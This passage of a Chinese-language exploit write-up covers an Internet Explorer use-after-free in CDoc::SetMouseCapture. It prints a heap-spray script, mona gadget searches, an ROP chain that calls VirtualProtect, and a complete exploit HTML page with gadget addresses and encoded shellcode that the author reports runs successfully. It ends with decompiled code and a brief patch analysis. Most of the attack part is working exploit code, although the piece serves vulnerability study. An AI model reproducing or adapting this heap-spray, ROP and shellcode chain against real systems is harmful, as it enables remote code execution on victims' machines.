+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">​	&lt;title&gt;&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">​	var sc&#x3D;&quot;\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141&quot;;</span><br><span class="line">​	var nop&#x3D;&quot;\u0c0c\u0c0c&quot;;</span><br><span class="line">​	var offset&#x3D;0x5ee-4&#x2F;2;&#x2F;&#x2F;0xbdc&#x2F;2-4&#x2F;2</span><br><span class="line">​	&#x2F;&#x2F;以0x10000为单位的shellcode+nop结构单元</span><br><span class="line">​	while(nop.length&lt;0x10000)</span><br><span class="line">​		nop+&#x3D;nop;</span><br><span class="line">​	var nop_chunk&#x3D;nop.substring(0,(0x10000&#x2F;2-sc.length)); &#x2F;&#x2F;Unicode编码，所以0x10000&#x2F;2个字节</span><br><span class="line">​	var sc_nop&#x3D;sc+nop_chunk;</span><br><span class="line">​	&#x2F;&#x2F;组合成单个大小为0x80000的堆块（heap-feng-shui)</span><br><span class="line">​	while(sc_nop.length&lt;0x100000)</span><br><span class="line">​		sc_nop+&#x3D;sc_nop;</span><br><span class="line">​	sc_nop&#x3D;sc_nop.substring(0,(0x80000-6)&#x2F;2-offset);&#x2F;&#x2F;组合成0x800000的堆块</span><br><span class="line">​	var offset_pattern&#x3D;nop.substring(0,offset); </span><br><span class="line">​	code&#x3D;offset_pattern+sc_nop;</span><br><span class="line">​	heap_chunks&#x3D;new Array();</span><br><span class="line">​	for(i&#x3D;0;i&lt;1000;i++)</span><br><span class="line">​	&#123;</span><br><span class="line">​		heap_chunks[i]&#x3D;code.substring(0,code.length);</span><br><span class="line">​	&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p>将这段代码替换poc中的heapspray函数，运行poc发现，程序成功跳转到41414141的位置。（因为0c0c0c0c地址已经被AAAA覆盖）</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MARraq.png" alt="img"> </p>
+<p>接下来只需要构造ROP链，使用VirtualProtect函数将0c0c0c0c开始的内存设置为可执行即可。大概参数可以</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BOOL VirtualProtect(</span><br><span class="line">shellcode 所在内存空间起始地址,</span><br><span class="line">shellcode 大小,</span><br><span class="line">0x40,</span><br><span class="line">某个可写地址</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以使用mona插件快速寻找gadgets</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">!py mona findwild -s &quot;mov esp,eax#*#retn&quot;</span><br><span class="line">0x760f0b51 |   0x760f0b51 (b+0x002b0b51)  : mov esp,eax # dec ecx # retn</span><br><span class="line">0x760e0ae2 |   0x760e0ae2 (b+0x002a0ae2)  : mov esp,ecx # dec ecx # retn 4</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-1-4构造ROP链"><a href="#2-1-4构造ROP链" class="headerlink" title="2.1.4构造ROP链"></a>2.1.4构造ROP链</h3><p>翻转栈帧到堆空间</p>
+<p>因为发生UAF之后，ESP指向的是当前的栈空间，而我们的rop链是放在heap里的。所以需要使用栈翻转，将esp指向我们堆中的rop链。这个部分也是非常有意思的。</p>
+<p>步骤（0）首先eax是我们可控的参数（通过占位TreeNode），ecx的值来源为[eax],所以eax的值不能直接指向我们的rop链，因为这样ecx会读取不到正确的值，call [ecx]也就不能跳转。</p>
+<p>步骤（1）ROP链头部必须执行栈翻转操作，否则rop链将无法成功执行。</p>
+<p>看大佬的案例是寻找xchg指令，对esp进行赋值。但是我并没有找到很合适的gadget。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!py mona find -s &quot;\x94\xc3&quot; 或者!py mona.py findwild -s &quot;xchg esp,eax#*#retn&quot;</span><br><span class="line">0x736c32fa |   0x736c32fa (b+0x000132fa)  : \x94\xc3</span><br></pre></td></tr></table></figure>
+<p>不过上穷水尽疑无路，柳暗花明又一村。我们找到了一组包含pop esp的gadget，可以修改esp为0c0c0c0c</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!py mona.py findwild -s &quot;push ecx#*#pop esp#*#retn&quot;</span><br><span class="line">0x75b48d9e |   0x75b48d9e (b+0x00398d9e)  : push ecx # pop esp # pop ebp # retn 4</span><br></pre></td></tr></table></figure>
+
+
+<p>步骤（2）上一个步骤执行到ret命令时，esp=0c0c0c10，所以在0c0c0c10起始埋下我们到ROP链接就行。</p>
+<p>步骤（3）ROP设置shellcode内存可执行之后，跳转到shellcode运行即可。</p>
+<p>ROP流程图</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Heap	</span><br><span class="line">(0) Reg  eip-&gt;0c0c0c0c ecx&#x3D;0c0c0c0c eax&#x3D;0c0c0c04 esp&#x3D;&gt;stack</span><br><span class="line">(1)&#x3D;&gt;0c0c0c0c  push ecx#pop esp#..#ret 4  &#x3D;&gt;  esp&#x3D;0c0c0c0c+4&#x3D;&gt;heap</span><br><span class="line">(2)&#x3D;&gt;0c0c0c10 ret &#x3D;&gt;esp&#x3D;0c0c0c10+4+4(因为ret4) </span><br><span class="line">0c0c0c14 0c0c0c0c (跳过4字节)</span><br><span class="line">(3)&#x3D;&gt;0c0c0c18  VirtualProtect_addr &#x3D;&gt;esp&#x3D;0c0c0c10-&gt;0c0c0c18(因为ret4)</span><br><span class="line">0c0c0c1c shellcode_addr -&gt;0c0c0c30</span><br><span class="line">0c0c0c20  0c0c0c00 [arg4]</span><br><span class="line">0c0c0c24  0x1000 [arg3]</span><br><span class="line">0c0c0c28  0x40 [arg2]</span><br><span class="line">0c0c0c2c  0c0c0c0c[arg1]</span><br><span class="line">(3)	0c0c0c30 shellcode</span><br></pre></td></tr></table></figure>
+
+
+<p>编写出EXP利用脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">​	&lt;title&gt;Migraine&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">​	Hello World!</span><br><span class="line">	&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">​		function trigger()</span><br><span class="line">​		&#123;</span><br><span class="line">​			Math.tan(2,1);</span><br><span class="line">​			var father&#x3D;document.createElement(&quot;father&quot;);</span><br><span class="line">​			var child&#x3D;document.createElement(&quot;child&quot;);</span><br><span class="line">​			Math.tan(1,2);</span><br><span class="line">​			document.body.appendChild(father);</span><br><span class="line">​			document.body.appendChild(child);</span><br><span class="line">​			Math.sin(1,2);</span><br><span class="line">​			child.applyElement(father);</span><br><span class="line"></span><br><span class="line">​			father.onlosecapture&#x3D;function() &#123;</span><br><span class="line">​				Heapspray();</span><br><span class="line">​				document.write(&quot;&quot;);</span><br><span class="line">​				&#x2F;&#x2F;Math.cos(1,2);</span><br><span class="line">​				tt &#x3D; new Array(20);</span><br><span class="line">​    			for(i &#x3D; 0; i &lt; tt.length; i++) &#123;</span><br><span class="line">​      			tt[i] &#x3D; document.createElement(&#39;div&#39;);</span><br><span class="line">​      			&#x2F;&#x2F;tt[i].className &#x3D; &quot;\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c&quot;;&#x2F;&#x2F;39x2字节</span><br><span class="line">​    			tt[i].className &#x3D; &quot;\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04&quot;;</span><br><span class="line">​    			&#x2F;&#x2F;将eax赋值为0c0c0c00</span><br><span class="line">​    			&#125;</span><br><span class="line">​    			Math.sin(1,2);</span><br><span class="line">​				&#x2F;&#x2F;alert(&quot;123&quot;);</span><br><span class="line">​			&#125;</span><br><span class="line"></span><br><span class="line">​			Math.cos(1,2);</span><br><span class="line">​			father[&#39;outerText&#39;]&#x3D;&quot;&quot;;</span><br><span class="line">​			Math.cos(1,2);</span><br><span class="line">​			father.setCapture();</span><br><span class="line">​			child.setCapture();</span><br><span class="line"></span><br><span class="line">​			function Heapspray()</span><br><span class="line">​			&#123;</span><br><span class="line">​				&#x2F;&#x2F;var rop_gadget&#x3D;&quot;\u0ae2\u760e&quot;; &#x2F;&#x2F;760e0ae2 #mov esp,eax #dec ecx#retn</span><br><span class="line">​				var rop_gadget&#x3D;&quot;\u8d9e\u75b4&quot; &#x2F;&#x2F;0x75b48d9e push ecx # pop esp #pop ebp</span><br><span class="line">​								+&quot;\u1480\u7690&quot; &#x2F;&#x2F;0x76901480 ret</span><br><span class="line">​								+&quot;\u0c0c\u0c0c&quot;  &#x2F;&#x2F;4 size</span><br><span class="line">​								+&quot;\u20d8\u7690&quot; &#x2F;&#x2F;VirtualProtect 0x769020d8</span><br><span class="line">​								+&quot;\u0c30\u0c0c&quot;&#x2F;&#x2F; shellcode_addr</span><br><span class="line">​								+&quot;\u0c00\u0c0c&quot;&#x2F;&#x2F;arg4</span><br><span class="line">​								+&quot;\u1000\u0000&quot;&#x2F;&#x2F;arg3</span><br><span class="line">​								+&quot;\u0040\u0000&quot;&#x2F;&#x2F;arg2</span><br><span class="line">​								+&quot;\u0c0c\u0c0c&quot;;&#x2F;&#x2F;arg1</span><br><span class="line">​				var shellcode&#x3D;&quot;\uc931\u8b64\u3041\u408b\u8b0c\u1470\u96ad\u8bad\u1058\u538B\u013c\u8bda\u7852\uda01\u728b\u0120\u31de\u41c9\u01ad\u81d8\u4738\u7465\u7550\u81f4\u0478\u6f72\u4163\ueb75\u7881\u6408\u7264\u7565\u8be2\u2472\ude01\u8b66\u4e0c\u8b49\u1c72\ude01\u148b\u018e\u31da\u53c9\u5152\u6168\u7972\u6841\u694c\u7262\u4c68\u616f\u5464\uff53\u83d2\u0cc4\u5059\uc031\ub866\u6c6c\u6850\u3233\u642e\u7568\u6573\u5472\u54ff\u1024\uc483\u500c\uc031\u6fb8\u4178\u5023\u6c83\u0324\u6823\u6761\u4265\u4d68\u7365\u5473\u74ff\u1024\u54ff\u1c24\uc483\u500c\uc031\ub866\u4646\u5450\uc031\u41b8\u4141\u5023\u6c83\u0324\u5423\uc031\uff50\u2474\uff04\u2474\u3110\u50c0\u54ff\u2024\uc483\u0010&quot;;</span><br><span class="line">​				var shellcode_old&#x3D;&quot;\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33\u6853\u6961\u656e\u6d68\u6769\u8b72\u53c4\u5050\uff53\ufc57\uff53\uf857&quot;;</span><br><span class="line">​				var sc&#x3D;&quot;\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c&quot;+rop_gadget+shellcode;</span><br><span class="line">​				var nop&#x3D;&quot;\u0c0c\u0c0c&quot;;</span><br><span class="line">​				var offset&#x3D;0x5ee-4&#x2F;2;&#x2F;&#x2F;0xbdc&#x2F;2-4&#x2F;2</span><br><span class="line"></span><br><span class="line">​				while(nop.length&lt;0x10000)</span><br><span class="line">​					nop+&#x3D;nop;</span><br><span class="line">​				var nop_chunk&#x3D;nop.substring(0,(0x10000&#x2F;2-sc.length)); &#x2F;&#x2F;Unicode编码，所以0x10000&#x2F;2个字节</span><br><span class="line"></span><br><span class="line">​				var sc_nop&#x3D;sc+nop_chunk;</span><br><span class="line"></span><br><span class="line">​				&#x2F;&#x2F;组合成单个大小为0x80000的堆块（heap-feng-shui)</span><br><span class="line">​				while(sc_nop.length&lt;0x100000)</span><br><span class="line">​					sc_nop+&#x3D;sc_nop;</span><br><span class="line">​				sc_nop&#x3D;sc_nop.substring(0,(0x80000-6)&#x2F;2-offset);&#x2F;&#x2F;组合成0x800000的堆块</span><br><span class="line">​				var offset_pattern&#x3D;nop.substring(0,offset); </span><br><span class="line">​				code&#x3D;offset_pattern+sc_nop;</span><br><span class="line">​				heap_chunks&#x3D;new Array();</span><br><span class="line">​				for(i&#x3D;0;i&lt;1000;i++)</span><br><span class="line">​				&#123;</span><br><span class="line">​					heap_chunks[i]&#x3D;code.substring(0,code.length);</span><br><span class="line">​				&#125;</span><br><span class="line">​			&#125;</span><br><span class="line">​		&#125;</span><br><span class="line">​		window.setTimeout(&quot;trigger()&quot;,1000);</span><br><span class="line">​	&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="EXP执行流分析"><a href="#EXP执行流分析" class="headerlink" title="EXP执行流分析"></a>EXP执行流分析</h4><p>直接进入一个gadget，执行栈翻转，esp被翻转到0c0c0c0c然后因为栈操作被继续提高到0c0c0c10，然后ret4跳转。</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MAR0qs.png" alt="img">)<img src="https://s2.ax1x.com/2019/11/07/MARDZn.png" alt="img">)<img src="https://s2.ax1x.com/2019/11/07/MAR6iV.png" alt="img">)<img src="https://s2.ax1x.com/2019/11/07/MARsI0.png" alt="img"> </p>
+<p>跳转前esp指向0c0c0c10，因为ret 4跳转之后esp变为了0c0c0c18而不是0c0c0c10</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MARjLd.png" alt="img"> </p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MARcGT.png" alt="img"> </p>
+<p>在0c0c0c18埋下VirtualProtect的地址，成功进入程序流。</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MARgRU.png" alt="img">)<img src="https://s2.ax1x.com/2019/11/07/MAR2zF.png" alt="img"> </p>
+<p>VirtualProtect其实只是VirtualProtectEX的一个外壳，在函数内部，将参数分别入栈再调用VirtualProtectEX。查看我们入栈的数据是否正确，发现EX函数比原函数多了一个参数。</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MARWM4.png" alt="img"> </p>
+<p>执行之后eax返回1，说明执行成功，shellcode所在地址已经能够执行。</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MARfsJ.png" alt="img"> </p>
+<p>进入shellcode执行，成功弹窗。</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MARhL9.png" alt="img"> </p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MAR5ZR.png" alt="img"> </p>
+<h3 id="2-1-5漏洞原因和补丁分析"><a href="#2-1-5漏洞原因和补丁分析" class="headerlink" title="2.1.5漏洞原因和补丁分析"></a>2.1.5漏洞原因和补丁分析</h3><p>我们使用IDA逆向分析关键函数SetMouseCapture。</p>
+<p>IDA 生成的伪代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">void __userpurge CDoc::SetMouseCapture(int a1@&lt;eax&gt;, CDoc *a2@&lt;ecx&gt;, CDoc *lpMem, int a4, void *a5, int a6, int a7, int a8)</span><br><span class="line">&#123;</span><br><span class="line">  CDoc *v8; &#x2F;&#x2F; ebx@1</span><br><span class="line">  int v9; &#x2F;&#x2F; edi@1</span><br><span class="line">  int v10; &#x2F;&#x2F; eax@6</span><br><span class="line">  int v11; &#x2F;&#x2F; ecx@7</span><br><span class="line">  void *v12; &#x2F;&#x2F; eax@11</span><br><span class="line">  CImplPtrAry *v13; &#x2F;&#x2F; ecx@15</span><br><span class="line">  struct CElementCapture *v14; &#x2F;&#x2F; esi@15</span><br><span class="line">  int v15; &#x2F;&#x2F; ecx@17</span><br><span class="line">  int v16; &#x2F;&#x2F; eax@18</span><br><span class="line">  CMessage *v17; &#x2F;&#x2F; ST14_4@22</span><br><span class="line">  CMessage *v18; &#x2F;&#x2F; ecx@22</span><br><span class="line">  CElementCapture *v19; &#x2F;&#x2F; ecx@23</span><br><span class="line">  CImplPtrAry *v20; &#x2F;&#x2F; ST14_4@24</span><br><span class="line">  CServer *v21; &#x2F;&#x2F; ecx@27</span><br><span class="line">  void *v22; &#x2F;&#x2F; [sp+0h] [bp-A8h]@0</span><br><span class="line">  char v23; &#x2F;&#x2F; [sp+10h] [bp-98h]@17</span><br><span class="line">  int v24; &#x2F;&#x2F; [sp+14h] [bp-94h]@17</span><br><span class="line">  int v25; &#x2F;&#x2F; [sp+A4h] [bp-4h]@6</span><br><span class="line">  void *lpMema; &#x2F;&#x2F; [sp+B0h] [bp+8h]@12</span><br><span class="line"></span><br><span class="line">  v8 &#x3D; lpMem;</span><br><span class="line">  v9 &#x3D; a1;</span><br><span class="line">  if ( *((_DWORD *)lpMem + 469) &amp; 0x1000 ) &#x2F;&#x2F;没有对TreeNode对象是否在Dom做检查</span><br><span class="line">​    v9 &#x3D; 0;</span><br><span class="line">  if ( v9 )</span><br><span class="line">  &#123;</span><br><span class="line">​    v25 &#x3D; (*((_DWORD *)lpMem + 65) &gt;&gt; 2) - 1;</span><br><span class="line">​    v10 &#x3D; v25;</span><br><span class="line">​    if ( v25 &lt; 0 )</span><br><span class="line">​      goto LABEL_31;</span><br><span class="line">​    v11 &#x3D; *((_DWORD *)lpMem + 67) + 4 * v25;</span><br><span class="line">​    do</span><br><span class="line">​    &#123;</span><br><span class="line">​      if ( *(_DWORD *)(*(_DWORD *)v11 + 8) &#x3D;&#x3D; v9 )</span><br><span class="line">​        break;</span><br><span class="line">​      --v10;</span><br><span class="line">​      v11 -&#x3D; 4;</span><br><span class="line">​    &#125;</span><br><span class="line">​    while ( v10 &gt;&#x3D; 0 );</span><br><span class="line">​    if ( v10 &lt; 0 )</span><br><span class="line">​    &#123;</span><br><span class="line">LABEL_31:</span><br><span class="line">​      v12 &#x3D; ATL_malloc(0x10u);</span><br><span class="line">​      lpMema &#x3D; (void *)(v12 ? CElementCapture::CElementCapture(v12, a7, a8, a4, a5) : 0);</span><br><span class="line">​      if ( lpMema )</span><br><span class="line">​      &#123;</span><br><span class="line">​        v14 &#x3D; CDoc::GetLastCapture(v8);</span><br><span class="line">​        if ( v14 &amp;&amp; CDoc::HasContainerCapture(v8, *(struct CElement ***)(v9 + 20)) )</span><br><span class="line">​        &#123;</span><br><span class="line">​          CMessage::CMessage(&amp;v23, 0);</span><br><span class="line">​          v24 &#x3D; 533;</span><br><span class="line">​          CDoc::PumpMessage(v8, (struct CMessage *)&amp;v23, 0, 0);</span><br><span class="line">​          if ( v14 &#x3D;&#x3D; CDoc::GetLastCapture(v8) )</span><br><span class="line">​          &#123;</span><br><span class="line">​            v16 &#x3D; *((_DWORD *)v14 + 3);</span><br><span class="line">​            if ( !(v16 &amp; 2) )</span><br><span class="line">​            &#123;</span><br><span class="line">​              v15 &#x3D; *((_DWORD *)v14 + 2);</span><br><span class="line">​              if ( !(*(_DWORD *)(v15 + 28) &amp; 0x8000000) )</span><br><span class="line">​              &#123;</span><br><span class="line">​                *((_DWORD *)v14 + 3) &#x3D; v16 | 2;</span><br><span class="line">​                *((_DWORD *)v8 + 469) |&#x3D; 0x1000u;</span><br><span class="line">​                CElement::FireEvent(</span><br><span class="line">​                  *((CElement **)v14 + 2),</span><br><span class="line">​                  (const struct PROPERTYDESC_BASIC *)&amp;s_propdescCElementonlosecapture,</span><br><span class="line">​                  1,</span><br><span class="line">​                  0,</span><br><span class="line">​                  -1,</span><br><span class="line">​                  0,</span><br><span class="line">​                  0);</span><br><span class="line">​                *((_DWORD *)v8 + 469) &amp;&#x3D; 0xFFFFEFFF;</span><br><span class="line">​              &#125;</span><br><span class="line">​            &#125;</span><br><span class="line">​          &#125;</span><br><span class="line">​          if ( *((_DWORD *)v8 + 65) &amp; 0xFFFFFFFC )</span><br><span class="line">​          &#123;</span><br><span class="line">​            if ( v14 &#x3D;&#x3D; CDoc::GetLastCapture(v8) )</span><br><span class="line">​            &#123;</span><br><span class="line">​              CElementCapture::~CElementCapture(v19);</span><br><span class="line">​              CBlockElement::operator delete((void *)v14);</span><br><span class="line">​              CImplPtrAry::Delete(v20, (int)v22);</span><br><span class="line">​            &#125;</span><br><span class="line">​            CImplPtrAry::Append(v19, v22);</span><br><span class="line">​          &#125;</span><br><span class="line">​          else</span><br><span class="line">​          &#123;</span><br><span class="line">​            CElementCapture::~CElementCapture((CElementCapture *)v15);</span><br><span class="line">​            CBlockElement::operator delete(lpMema);</span><br><span class="line">​            v18 &#x3D; v17;</span><br><span class="line">​          &#125;</span><br><span class="line">​          CMessage::~CMessage(v18);</span><br><span class="line">​        &#125;</span><br><span class="line">​        else</span><br><span class="line">​        &#123;</span><br><span class="line">​          CImplPtrAry::Append(v13, v22);</span><br><span class="line">​          if ( !v14 )</span><br><span class="line">​            CServer::SetCapture(v21, 1);</span><br><span class="line">​        &#125;</span><br><span class="line">​      &#125;</span><br><span class="line">​    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">​    CDoc::ClearMouseCapture(a2, lpMem);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>对比微软的补丁可以知道，微软在进入LABEL_31:段前增加了判断，TreeNode是否在Dom树上，如果TreeNode不在Dom树上就不会进入LABEL_31的，也就不会触发漏洞。</p>
+<p>经过之前的动态分析，可以知道进入LABEL_31之后会进入PumpMessage-&gt;NodeAddRef-&gt;GetInterface，最后导致UAF触发任意代码执行。</p>
+<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1].Use After Free Exploits for Humans Part 1 – Exploiting MS13-080 on IE8 winxpsp3[DB/OL].</p>
+<p><a href="https://webstersprodigy.net/2014/11/19/use-after-free-exploits-for-humans-part-1-exploiting-ms13-080-on-ie8-winxpsp3/,2014-9-19" target="_blank" rel="noopener">https://webstersprodigy.net/2014/11/19/use-after-free-exploits-for-humans-part-1-exploiting-ms13-080-on-ie8-winxpsp3/,2014-9-19</a></p>
+<p>[2]Payload_82.(<a href="https://www.52pojie.cn/home.php?mod=space&amp;uid=817719).暴雷漏洞" target="_blank" rel="noopener">https://www.52pojie.cn/home.php?mod=space&amp;uid=817719).暴雷漏洞</a> （CVE-2012-1889）个人漏洞分析报告[DB/OL].<a href="https://www.52pojie.cn/thread-730324-1-1.html,2018-4-24" target="_blank" rel="noopener">https://www.52pojie.cn/thread-730324-1-1.html,2018-4-24</a></p>
+<p>[3]0x9A82.IE浏览器漏洞综合利用技术：堆喷射技术[DB/OL].<a href="https://bbs.pediy.com/thread-223106.htm,2017-12-4" target="_blank" rel="noopener">https://bbs.pediy.com/thread-223106.htm,2017-12-4</a> </p>
